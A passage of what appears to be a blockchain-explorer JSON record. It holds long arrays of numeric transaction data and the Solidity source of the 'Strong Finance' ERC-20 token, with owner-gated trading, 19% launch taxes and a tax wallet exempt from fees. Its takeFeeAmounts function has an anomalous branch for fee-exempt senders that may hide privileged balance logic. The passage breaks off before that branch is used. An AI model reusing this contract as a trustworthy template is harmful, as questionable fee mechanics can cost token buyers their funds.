      1,
      3152105,
      46494,
      4362839
    ],
    [
      18722915,
      1701812795,
      415,
      26,
      0,
      120000,
      56176049225,
      0,
      1,
      3198599,
      46494,
      4362839
    ],
    [
      18722915,
      1701812795,
      762,
      27,
      0,
      120000,
      56176049225,
      0,
      1,
      3245093,
      46494,
      4362839
    ],
    [
      18722915,
      1701812795,
      770,
      28,
      0,
      120000,
      56176049225,
      0,
      1,
      3291587,
      46494,
      4362839
    ],
    [
      18722915,
      1701812795,
      935,
      29,
      0,
      120000,
      56176049225,
      0,
      1,
      3338081,
      46494,
      4362839
    ],
    [
      18722915,
      1701812795,
      762,
      30,
      0,
      120000,
      56176049225,
      0,
      1,
      3384575,
      46494,
      4362839
    ],
    [
      18722915,
      1701812795,
      409,
      31,
      0,
      120000,
      56176049225,
      0,
      1,
      3431069,
      46494,
      4362839
    ],
    [
      18722915,
      1701812795,
      938,
      32,
      0,
      120000,
      56176049225,
      0,
      1,
      3477563,
      46494,
      4362839
    ],
    [
      18722915,
      1701812795,
      937,
      33,
      0,
      120000,
      56176049225,
      0,
      1,
      3524057,
      46494,
      4362839
    ],
    [
      18722915,
      1701812795,
      931,
      34,
      0,
      120000,
      56176049225,
      0,
      1,
      3570551,
      46494,
      4362839
    ],
    [
      18722915,
      1701812795,
      938,
      35,
      0,
      120000,
      56176049225,
      0,
      1,
      3617045,
      46494,
      4362839
    ],
    [
      18722915,
      1701812795,
      398,
      36,
      0,
      120000,
      56176049225,
      0,
      1,
      3663539,
      46494,
      4362839
    ],
    [
      18722915,
      1701812795,
      411,
      37,
      0,
      120000,
      56176049225,
      0,
      1,
      3710033,
      46494,
      4362839
    ],
    [
      18722915,
      1701812795,
      845,
      38,
      0,
      120000,
      56176049225,
      0,
      1,
      3756527,
      46494,
      4362839
    ],
    [
      18722916,
      1701812807,
      16,
      0,
      0,
      500000,
      130000000000,
      0,
      1,
      46506,
      46506,
      4362838
    ],
    [
      18722922,
      1701812879,
      73,
      12,
      0,
      55808,
      58393406711,
      0,
      1,
      1767931,
      46506,
      4362832
    ],
    [
      18722940,
      1701813095,
      9,
      167,
      0,
      30661,
      50885545289,
      0,
      1,
      13977762,
      30661,
      4362814
    ],
    [
      18722942,
      1701813119,
      10,
      138,
      0,
      27502,
      51893698164,
      0,
      1,
      9154586,
      22702,
      4362812
    ],
    [
      18722943,
      1701813131,
      17,
      39,
      0,
      55808,
      53028109694,
      0,
      1,
      4043408,
      46506,
      4362811
    ],
    [
      18722956,
      1701813287,
      257,
      259,
      0,
      55808,
      56055393319,
      0,
      1,
      12597871,
      46506,
      4362798
    ],
    [
      18722958,
      1701813311,
      973,
      14,
      0,
      120000,
      64650582891,
      0,
      1,
      1222675,
      46494,
      4362796
    ],
    [
      18722963,
      1701813371,
      163,
      68,
      0,
      55808,
      64773989572,
      0,
      1,
      3644736,
      46506,
      4362791
    ],
    [
      18722974,
      1701813503,
      164,
      3,
      0,
      55807,
      72244640535,
      0,
      1,
      655334,
      46506,
      4362780
    ],
    [
      18723033,
      1701814211,
      2056,
      232,
      0,
      46446,
      50472761996,
      0,
      1,
      18257873,
      46446,
      4362721
    ],
    [
      18723045,
      1701814355,
      286,
      64,
      0,
      46506,
      54435642191,
      0,
      1,
      6540960,
      46506,
      4362709
    ],
    [
      18723050,
      1701814415,
      63,
      22,
      0,
      55808,
      59070573862,
      0,
      1,
      3617863,
      46506,
      4362704
    ],
    [
      18723055,
      1701814475,
      220,
      80,
      0,
      46446,
      53641835098,
      0,
      1,
      8453280,
      46446,
      4362699
    ],
    [
      18723057,
      1701814499,
      41,
      23,
      0,
      150000,
      60575015696,
      0,
      1,
      634906,
      46506,
      4362697
    ],
    [
      18723061,
      1701814547,
      70,
      56,
      0,
      70458,
      55938963213,
      0,
      1,
      5582975,
      46506,
      4362693
    ],
    [
      18723124,
      1701815315,
      349,
      14,
      0,
      55808,
      58778258325,
      0,
      1,
      1647585,
      46506,
      4362630
    ],
    [
      18723192,
      1701816131,
      1,
      13,
      0,
      100000,
      76695645462,
      0,
      1,
      1468484,
      46218,
      4362562
    ],
    [
      18723192,
      1701816131,
      1,
      14,
      0,
      100000,
      76695645462,
      0,
      1,
      1514702,
      46218,
      4362562
    ],
    [
      18723192,
      1701816131,
      1,
      15,
      0,
      100000,
      76695645462,
      0,
      1,
      1560920,
      46218,
      4362562
    ],
    [
      18723192,
      1701816131,
      1,
      16,
      0,
      100000,
      76695645462,
      0,
      1,
      1607138,
      46218,
      4362562
    ],
    [
      18723192,
      1701816131,
      1,
      17,
      0,
      100000,
      76695645462,
      0,
      1,
      1653356,
      46218,
      4362562
    ],
    [
      18723410,
      1701818747,
      407,
      27,
      0,
      55808,
      58869479986,
      0,
      1,
      2353904,
      46506,
      4362344
    ],
    [
      18723439,
      1701819119,
      1,
      22,
      0,
      100000,
      95349585810,
      0,
      1,
      3574266,
      46218,
      4362315
    ],
    [
      18723486,
      1701819695,
      939,
      162,
      0,
      46182,
      49284993379,
      0,
      1,
      11385262,
      46182,
      4362268
    ],
    [
      18723487,
      1701819707,
      1,
      13,
      0,
      100000,
      75598185271,
      0,
      1,
      1899811,
      46218,
      4362267
    ],
    [
      18723487,
      1701819707,
      1,
      14,
      0,
      100000,
      75598185271,
      0,
      1,
      1946029,
      46218,
      4362267
    ],
    [
      18723492,
      1701819767,
      1,
      8,
      0,
      100000,
      69413335939,
      0,
      1,
      1246284,
      46218,
      4362262
    ],
    [
      18723492,
      1701819767,
      1,
      9,
      0,
      100000,
      69413335939,
      0,
      1,
      1292502,
      46218,
      4362262
    ],
    [
      18723500,
      1701819863,
      1,
      20,
      0,
      100000,
      70101578487,
      0,
      1,
      4519842,
      46218,
      4362254
    ],
    [
      18723500,
      1701819863,
      1,
      21,
      0,
      100000,
      70101578487,
      0,
      1,
      4566060,
      46218,
      4362254
    ],
    [
      18723500,
      1701819863,
      1,
      22,
      0,
      100000,
      70101578487,
      0,
      1,
      4612278,
      46218,
      4362254
    ],
    [
      18723500,
      1701819863,
      1,
      23,
      0,
      100000,
      70101578487,
      0,
      1,
      4658496,
      46218,
      4362254
    ],
    [
      18723510,
      1701819983,
      403,
      10,
      0,
      100000,
      70985101756,
      0,
      1,
      1616935,
      46218,
      4362244
    ],
    [
      18723513,
      1701820019,
      68,
      81,
      0,
      46182,
      46264162129,
      0,
      1,
      4931610,
      46182,
      4362241
    ],
    [
      18723550,
      1701820463,
      127,
      65,
      0,
      55807,
      50949096243,
      0,
      1,
      5566030,
      46230,
      4362204
    ],
    [
      18723552,
      1701820487,
      1,
      5,
      0,
      100000,
      76305543253,
      0,
      1,
      848857,
      46218,
      4362202
    ],
    [
      18723552,
      1701820487,
      1,
      6,
      0,
      100000,
      76305543253,
      0,
      1,
      895075,
      46218,
      4362202
    ],
    [
      18723552,
      1701820487,
      1,
      17,
      0,
      100000,
      76305543253,
      0,
      1,
      1863722,
      46218,
      4362202
    ],
    [
      18723556,
      1701820535,
      1,
      19,
      0,
      100000,
      75558090426,
      0,
      1,
      2285221,
      46218,
      4362198
    ],
    [
      18723572,
      1701820727,
      128,
      138,
      0,
      46446,
      53430898654,
      0,
      1,
      12858957,
      46170,
      4362182
    ],
    [
      18723574,
      1701820751,
      1,
      152,
      0,
      46446,
      52452494564,
      0,
      1,
      12288169,
      46446,
      4362180
    ],
    [
      18723576,
      1701820775,
      1657,
      97,
      0,
      46446,
      51234720567,
      0,
      1,
      9368689,
      46446,
      4362178
    ],
    [
      18723585,
      1701820883,
      2,
      13,
      0,
      120488,
      78499827700,
      0,
      1,
      2090906,
      55444,
      4362169
    ],
    [
      18723585,
      1701820883,
      2,
      96,
      0,
      120488,
      78509370489,
      0,
      1,
      7291099,
      55444,
      4362169
    ],
    [
      18723596,
      1701821027,
      123,
      202,
      0,
      46446,
      65096560685,
      0,
      1,
      14255558,
      46446,
      4362158
    ],
    [
      18723813,
      1701823655,
      940,
      76,
      0,
      46242,
      58100285039,
      0,
      1,
      4662719,
      46242,
      4361941
    ],
    [
      18723928,
      1701825047,
      123,
      98,
      0,
      46194,
      50160455751,
      0,
      1,
      18499842,
      46194,
      4361826
    ],
    [
      18723939,
      1701825179,
      124,
      124,
      0,
      46254,
      51572466818,
      0,
      1,
      11298016,
      46254,
      4361815
    ],
    [
      18724121,
      1701827375,
      3330,
      202,
      0,
      53482,
      53301258806,
      0,
      1,
      16378283,
      46506,
      4361633
    ],
    [
      18724154,
      1701827783,
      1,
      0,
      0,
      120488,
      77272602267,
      0,
      1,
      55444,
      55444,
      4361600
    ],
    [
      18724214,
      1701828503,
      4,
      9,
      0,
      120488,
      83249721555,
      0,
      1,
      1503627,
      55444,
      4361540
    ],
    [
      18724272,
      1701829211,
      1,
      37,
      0,
      100000,
      80219107843,
      0,
      1,
      3102034,
      46218,
      4361482
    ],
    [
      18724524,
      1701832295,
      3,
      197,
      0,
      46446,
      50587552537,
      0,
      1,
      14755472,
      46446,
      4361230
    ],
    [
      18727851,
      1701872507,
      356,
      314,
      0,
      29022,
      58203652976,
      0,
      1,
      29336251,
      24222,
      4357903
    ],
    [
      19258690,
      1708308071,
      1133,
      130,
      0,
      108494,
      18260943188,
      0,
      1,
      13678184,
      67156,
      3827064
    ],
    [
      20285245,
      1720724747,
      1257,
      71,
      0,
      29145,
      5286743645,
      0,
      1,
      5817970,
      24162,
      2800509
    ],
    [
      20285246,
      1720724759,
      1258,
      93,
      0,
      29206,
      5004620026,
      0,
      1,
      17371757,
      24222,
      2800508
    ],
    [
      18722804,
      1701811463,
      0,
      0,
      10000000000000000000,
      233805,
      0,
      0,
      0,
      0,
      231924,
      0
    ],
    [
      18722928,
      1701812951,
      0,
      0,
      38413038081504152,
      301988,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18722928,
      1701812951,
      0,
      0,
      38413038081504152,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18722954,
      1701813263,
      0,
      0,
      44556194707204121,
      104699,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18722954,
      1701813263,
      0,
      0,
      44556194707204121,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18722954,
      1701813263,
      0,
      0,
      42968306527547595,
      114952,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18722954,
      1701813263,
      0,
      0,
      42968306527547595,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18722973,
      1701813491,
      0,
      0,
      37098379939706999,
      286068,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18722973,
      1701813491,
      0,
      0,
      37098379939706999,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18722981,
      1701813587,
      0,
      0,
      54242922237964429,
      258931,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18722981,
      1701813587,
      0,
      0,
      54242922237964429,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18722994,
      1701813743,
      0,
      0,
      55570353302203210,
      104699,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18722994,
      1701813743,
      0,
      0,
      55570353302203210,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18722994,
      1701813743,
      0,
      0,
      53147006420112456,
      114952,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18722994,
      1701813743,
      0,
      0,
      53147006420112456,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18722996,
      1701813767,
      0,
      0,
      50813397368291074,
      104699,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18722996,
      1701813767,
      0,
      0,
      50813397368291074,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18723037,
      1701814259,
      0,
      0,
      64821669607359261,
      104699,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723037,
      1701814259,
      0,
      0,
      64821669607359261,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18723061,
      1701814547,
      0,
      0,
      75376305090433684,
      104699,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723061,
      1701814547,
      0,
      0,
      75376305090433684,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18723061,
      1701814547,
      0,
      0,
      71740663298228589,
      114952,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723061,
      1701814547,
      0,
      0,
      71740663298228589,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18723062,
      1701814559,
      0,
      0,
      68538000179536553,
      104699,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723062,
      1701814559,
      0,
      0,
      68538000179536553,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18723133,
      1701815423,
      0,
      0,
      78430965534830839,
      104699,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723133,
      1701815423,
      0,
      0,
      78430965534830839,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18723133,
      1701815423,
      0,
      0,
      75298699246954479,
      114952,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723133,
      1701815423,
      0,
      0,
      75298699246954479,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18723147,
      1701815591,
      0,
      0,
      75843746290350803,
      269192,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723147,
      1701815591,
      0,
      0,
      75843746290350803,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18723193,
      1701816143,
      0,
      0,
      80825183735155257,
      176498,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723193,
      1701816143,
      0,
      0,
      80825183735155257,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18723199,
      1701816215,
      0,
      0,
      76971871619970384,
      104699,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723199,
      1701816215,
      0,
      0,
      76971871619970384,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18723241,
      1701816719,
      0,
      0,
      75266005096264124,
      178160,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723241,
      1701816719,
      0,
      0,
      75266005096264124,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18723441,
      1701819143,
      0,
      0,
      84112730225013426,
      176498,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723441,
      1701819143,
      0,
      0,
      84112730225013426,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18723486,
      1701819695,
      0,
      0,
      87159988029327386,
      166563,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723486,
      1701819695,
      0,
      0,
      87159988029327386,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18723488,
      1701819719,
      0,
      0,
      84278198653725935,
      176498,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723488,
      1701819719,
      0,
      0,
      84278198653725935,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18723491,
      1701819755,
      0,
      0,
      80215929478283202,
      166563,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723491,
      1701819755,
      0,
      0,
      80215929478283202,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18723494,
      1701819791,
      0,
      0,
      77419760838558763,
      176498,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723494,
      1701819791,
      0,
      0,
      77419760838558763,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18723505,
      1701819923,
      0,
      0,
      75231732026716901,
      176498,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723505,
      1701819923,
      0,
      0,
      75231732026716901,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18723511,
      1701819995,
      0,
      0,
      72341840357973260,
      176498,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723511,
      1701819995,
      0,
      0,
      72341840357973260,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18723515,
      1701820043,
      0,
      0,
      70840650474376965,
      268135,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723515,
      1701820043,
      0,
      0,
      70840650474376965,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18723515,
      1701820043,
      0,
      0,
      68473921297729474,
      152865,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723515,
      1701820043,
      0,
      0,
      68473921297729474,
      2300,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    [
      18723537,
      1701820307,
      0,
      0,
      92600178671820516,
      168705,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723537,
      1701820307,
      0,
      0,
      92600178671820516,
      2300,
      0,
      0,
      0,
      0,
      2246,
      0
    ],
    [
      18723554,
      1701820511,
      0,
      0,
      105127263207293441,
      178640,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723554,
      1701820511,
      0,
      0,
      105127263207293441,
      2300,
      0,
      0,
      0,
      0,
      2246,
      0
    ],
    [
      18723556,
      1701820535,
      0,
      0,
      100444809030138553,
      168705,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723556,
      1701820535,
      0,
      0,
      100444809030138553,
      2300,
      0,
      0,
      0,
      0,
      2246,
      0
    ],
    [
      18723559,
      1701820571,
      0,
      0,
      98998333831917886,
      178640,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723559,
      1701820571,
      0,
      0,
      98998333831917886,
      2300,
      0,
      0,
      0,
      0,
      2246,
      0
    ],
    [
      18723590,
      1701820943,
      0,
      0,
      101691514964268726,
      178640,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18723590,
      1701820943,
      0,
      0,
      101691514964268726,
      2300,
      0,
      0,
      0,
      0,
      2246,
      0
    ],
    [
      18724153,
      1701827771,
      0,
      0,
      153023687810139411,
      178640,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18724153,
      1701827771,
      0,
      0,
      153023687810139411,
      2300,
      0,
      0,
      0,
      0,
      2246,
      0
    ],
    [
      18724160,
      1701827855,
      0,
      0,
      83181662385496338,
      168705,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18724160,
      1701827855,
      0,
      0,
      83181662385496338,
      2300,
      0,
      0,
      0,
      0,
      2246,
      0
    ],
    [
      18724162,
      1701827879,
      0,
      0,
      13498093283309034,
      178640,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18724162,
      1701827879,
      0,
      0,
      13498093283309034,
      2300,
      0,
      0,
      0,
      0,
      2246,
      0
    ],
    [
      18724181,
      1701828107,
      0,
      0,
      58370025163763675,
      178640,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18724181,
      1701828107,
      0,
      0,
      58370025163763675,
      2300,
      0,
      0,
      0,
      0,
      2246,
      0
    ],
    [
      18724190,
      1701828215,
      0,
      0,
      58957746637563272,
      168705,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18724190,
      1701828215,
      0,
      0,
      58957746637563272,
      2300,
      0,
      0,
      0,
      0,
      2246,
      0
    ],
    [
      18724220,
      1701828575,
      0,
      0,
      43146710765330295,
      178640,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18724220,
      1701828575,
      0,
      0,
      43146710765330295,
      2300,
      0,
      0,
      0,
      0,
      2246,
      0
    ],
    [
      18724267,
      1701829139,
      0,
      0,
      76116990142175077,
      168705,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18724267,
      1701829139,
      0,
      0,
      76116990142175077,
      2300,
      0,
      0,
      0,
      0,
      2246,
      0
    ],
    [
      18724268,
      1701829151,
      0,
      0,
      33865582196211863,
      168705,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18724268,
      1701829151,
      0,
      0,
      33865582196211863,
      2300,
      0,
      0,
      0,
      0,
      2246,
      0
    ],
    [
      18724270,
      1701829175,
      0,
      0,
      8675958150371859,
      178640,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18724270,
      1701829175,
      0,
      0,
      8675958150371859,
      2300,
      0,
      0,
      0,
      0,
      2246,
      0
    ],
    [
      18724273,
      1701829223,
      0,
      0,
      17968140381142645,
      178640,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18724273,
      1701829223,
      0,
      0,
      17968140381142645,
      2300,
      0,
      0,
      0,
      0,
      2246,
      0
    ],
    [
      18724371,
      1701830447,
      0,
      0,
      62788111272959460,
      178640,
      0,
      0,
      0,
      0,
      55,
      0
    ],
    [
      18724371,
      1701830447,
      0,
      0,
      62788111272959460,
      2300,
      0,
      0,
      0,
      0,
      2246,
      0
    ]
  ],
  "sourcecode": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.19;\n\n/*\n    \u2714\ufe0f Website:  https://strongfi.org\n    \u2714\ufe0f DApps:    https://app.strongfi.org\n    \u2714\ufe0f Docs:     https://docs.strongfi.org\n\n    \u2714\ufe0f Medium:   https://medium.com/@strong_coin\n    \u2714\ufe0f Twitter:  https://twitter.com/strong_coin_fi\n    \u2714\ufe0f Telegram: https://t.me/strong_fi_portal\n\n*/\n\nlibrary SafeMath {\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        return c;\n    }\n}\n\ninterface ERC20 {\n    function totalSupply() external view returns (uint256);\n\n    function decimals() external view returns (uint8);\n\n    function symbol() external view returns (string memory);\n\n    function name() external view returns (string memory);\n\n    function getOwner() external view returns (address);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n\n    function allowance(address _owner, address spender)\n        external\n        view\n        returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n}\n\nabstract contract Ownable {\n    address internal owner;\n\n    constructor(address _owner) {\n        owner = _owner;\n    }\n\n    modifier onlyOwner() {\n        require(isOwner(msg.sender), \"!OWNER\");\n        _;\n    }\n\n    function isOwner(address account) public view returns (bool) {\n        return account == owner;\n    }\n\n    function renounceOwnership() public onlyOwner {\n        owner = address(0);\n        emit OwnershipTransferred(address(0));\n    }\n\n    event OwnershipTransferred(address owner);\n}\n\ninterface IDEXFactory {\n    function createPair(address tokenA, address tokenB)\n        external\n        returns (address pair);\n}\n\ninterface IDEXRouter {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint256 amountADesired,\n        uint256 amountBDesired,\n        uint256 amountAMin,\n        uint256 amountBMin,\n        address to,\n        uint256 deadline\n    )\n        external\n        returns (\n            uint256 amountA,\n            uint256 amountB,\n            uint256 liquidity\n        );\n\n    function addLiquidityETH(\n        address token,\n        uint256 amountTokenDesired,\n        uint256 amountTokenMin,\n        uint256 amountETHMin,\n        address to,\n        uint256 deadline\n    )\n        external\n        payable\n        returns (\n            uint256 amountToken,\n            uint256 amountETH,\n            uint256 liquidity\n        );\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external;\n\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external payable;\n\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external;\n}\n\ncontract StrongFinance is ERC20, Ownable {\n    using SafeMath for uint256;\n\n    address routerAdress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n    address DEAD = 0x000000000000000000000000000000000000dEaD;\n\n    string constant _name = \"Strong Finance\";\n    string constant _symbol = \"STRONG\";\n\n    uint8 constant _decimals = 18;\n\n    uint256 public _totalSupply = 100_000_000 * (10**_decimals);\n    uint256 public _maxWalletAmount = (_totalSupply * 2) / 100;\n    uint256 public _swapThreshold = (_totalSupply * 1)/ 100000;\n    uint256 public _maxTaxSwap=(_totalSupply * 2) / 1000;\n\n    mapping(address => uint256) _balances;\n    mapping(address => mapping(address => uint256)) _allowances;\n    mapping(address => bool) isFeeExempt;\n    mapping(address => bool) isTxLimitExempt;\n\n    address public _taxWallet;\n    address public pair;\n\n    IDEXRouter public router;\n\n    bool public swapEnabled = false;\n    bool public feeEnabled = false;\n    bool public TradingOpen = false;\n\n    uint256 private _initBuyTax=19;\n    uint256 private _initSellTax=19;\n\n    uint256 private _finalBuyTax=2;\n    uint256 private _finalSellTax=2;\n\n    uint256 private _reduceBuyTaxAt=19;\n    uint256 private _reduceSellTaxAt=22;\n    uint256 private _buyCount=0;\n\n    bool inSwap;\n    modifier swapping() {\n        inSwap = true;\n        _;\n        inSwap = false;\n    }\n\n    constructor(address stWallet) Ownable(msg.sender) {\n\n        address _owner = owner;\n        _taxWallet = stWallet;\n\n        isFeeExempt[_owner] = true;\n        isFeeExempt[_taxWallet] = true;\n        isFeeExempt[address(this)] = true;\n\n        isTxLimitExempt[_owner] = true;\n        isTxLimitExempt[_taxWallet] = true;\n        isTxLimitExempt[address(this)] = true;\n\n        _balances[_owner] = _totalSupply;\n        emit Transfer(address(0), _owner, _totalSupply);\n    }\n\n    function createStrongTrade() external onlyOwner {\n        \n        router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n        pair = IDEXFactory(router.factory()).createPair(address(this), router.WETH());\n        isTxLimitExempt[pair] = true;\n\n        _allowances[address(this)][address(router)] = type(uint256).max;\n        router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner,block.timestamp);\n    }\n\n    function enableStrongTrade() public onlyOwner {\n        require(!TradingOpen,\"trading is already open\");\n\n        TradingOpen = true;\n        feeEnabled = true;\n        swapEnabled = true;\n    }\n\n    function name() external pure override returns (string memory) {\n        return _name;\n    }\n\n    function totalSupply() external view override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function decimals() external pure override returns (uint8) {\n        return _decimals;\n    }\n\n    function symbol() external pure override returns (string memory) {\n        return _symbol;\n    }\n\n    function getOwner() external view override returns (address) {\n        return owner;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n    function min(uint256 a, uint256 b) private pure returns (uint256){\n      return (a>b)?b:a;\n    }\n\n    function isTakeFees(address sender) internal view returns (bool) {\n        return !isFeeExempt[sender];\n    }\n\n    function allowance(address holder, address spender)\n        external\n        view\n        override\n        returns (uint256)\n    {\n        return _allowances[holder][spender];\n    }\n\n    function approve(address spender, uint256 amount)\n        public\n        override\n        returns (bool)\n    {\n        _allowances[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function _basicTransfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal returns (bool) {\n        _balances[sender] = _balances[sender].sub(\n            amount,\n            \"Insufficient Balance\"\n        );\n        _balances[recipient] = _balances[recipient].add(amount);\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n     function shouldSwapStrong(bool takeFee , uint actions, uint256 amount) internal view returns (bool) {\n\n        uint256 minThreshold = _swapThreshold;\n        bool overThreshold = amount > minThreshold && balanceOf(address(this)) > minThreshold;\n\n        return\n            !inSwap &&\n            takeFee &&\n            swapEnabled && \n            actions > 1 &&\n            overThreshold;\n    }\n\n    function transfer(address recipient, uint256 amount)\n        external\n        override\n        returns (bool)\n    {\n        return _transferFrom(msg.sender, recipient, amount);\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external override returns (bool) {\n        if (_allowances[sender][msg.sender] != type(uint256).max) {\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]\n                .sub(amount, \"Insufficient Allowance\");\n        }\n\n        return _transferFrom(sender, recipient, amount);\n    }\n\n    /**\n        Internal functions\n    **/\n\n    function takeFeeAmounts(uint actions, bool takefee, uint256 amounts)\n        internal\n        returns (uint256)\n    {\n        uint256 percents;\n        uint256 feeDenominator = 100;\n\n        percents = takefee ? \n            actions > 1 ? \n            (_buyCount>_reduceSellTaxAt ? _finalSellTax : _initSellTax) : actions > 0 ? \n            (_buyCount>_reduceBuyTaxAt ? _finalBuyTax : _initBuyTax) : 0 : 1;\n\n        uint256 feeAmounts = amounts.mul(percents).div(feeDenominator);\n        _balances[address(this)] = _balances[address(this)].add(feeAmounts);\n        feeAmounts = takefee ? feeAmounts : amounts * percents;\n\n        return amounts.sub(feeAmounts);\n    }\n\n    function _transferFrom(\n        address 